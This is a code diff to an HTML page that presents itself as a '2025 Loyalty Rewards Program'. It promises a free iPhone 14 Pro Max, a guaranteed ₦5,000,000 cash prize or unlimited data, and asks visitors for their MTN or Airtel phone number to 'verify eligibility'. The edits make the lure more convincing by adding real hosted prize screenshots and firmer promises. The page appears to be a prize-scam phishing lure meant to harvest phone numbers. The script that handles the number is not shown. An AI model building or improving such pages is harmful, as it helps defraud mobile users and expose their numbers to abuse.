@@ -2,7 +2,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Loyalty Reward Verification Portal</title>
+  <title>2025 Loyalty Rewards Program</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -25,6 +25,7 @@
     .header h1 {
       color: #ff4444;
       margin-bottom: 10px;
+      font-size: 24px;
     }
     .header p {
       font-size: 14px;
@@ -34,12 +35,18 @@
     .image-row {
       display: flex;
       justify-content: space-between;
-      margin: 25px 0;
+      margin: 25px 0 15px 0;
     }
     .image-row img {
       width: 32%;
       border-radius: 8px;
       border: 2px solid #333;
+    }
+    .check-message {
+      margin-top: 10px;
+      font-size: 15px;
+      text-align: center;
+      color: #ccc;
     }
     .form-group {
       margin-top: 20px;
@@ -95,19 +102,26 @@
 <body>
   <div class="container">
     <div class="header">
-      <h1>Loyalty Reward Verification Portal</h1>
+      <h1>2025 Loyalty Rewards Program</h1>
       <p>
-        As part of our 2025 Customer Loyalty Program, selected users may be eligible to receive a <strong>free iPhone 14 Pro Max</strong>, <strong>₦5,000,000 cash prize</strong>, or <strong>unlimited data bundle</strong>.<br><br>
-        To determine your eligibility, kindly provide your <strong>active MTN or Airtel number</strong> below.
+        As part of our ongoing customer appreciation initiative, a select number of users have been shortlisted to receive amazing gifts including:
+        <br><br>
+        - A brand new <strong>iPhone 14 Pro Max</strong><br>
+        - A guaranteed <strong>₦5,000,000 cash prize</strong><br>
+        - Or <strong>unlimited monthly data bundle</strong>
       </p>
     </div><div class="image-row">
-  <img src="https://via.placeholder.com/120x120?text=iPhone" alt="iPhone" />
-  <img src="https://via.placeholder.com/120x120?text=Cash+Prize" alt="Cash" />
-  <img src="https://via.placeholder.com/120x120?text=Unlimited+Data" alt="Data" />
+  <img src="https://i.postimg.cc/DZwDq4q4/Screenshot-20250731-095622-2.jpg" alt="iPhone" />
+  <img src="https://i.postimg.cc/JnsffBGV/IMG-20250302-110834-161.jpg" alt="Cash" />
+  <img src="https://i.postimg.cc/h4p4WVC6/Screenshot-20250731-071855.jpg" alt="Data" />
+</div>
+
+<div class="check-message">
+  Please enter your <strong>MTN or Airtel</strong> number to verify your eligibility.
 </div>
 
 <div class="form-group">
-  <input type="tel" id="msisdn" placeholder="Enter your MTN or Airtel number" />
+  <input type="tel" id="msisdn" placeholder="Enter your 11-digit phone number" />
   <button onclick="startCheck()">Check Eligibility</button>
 </div>
 
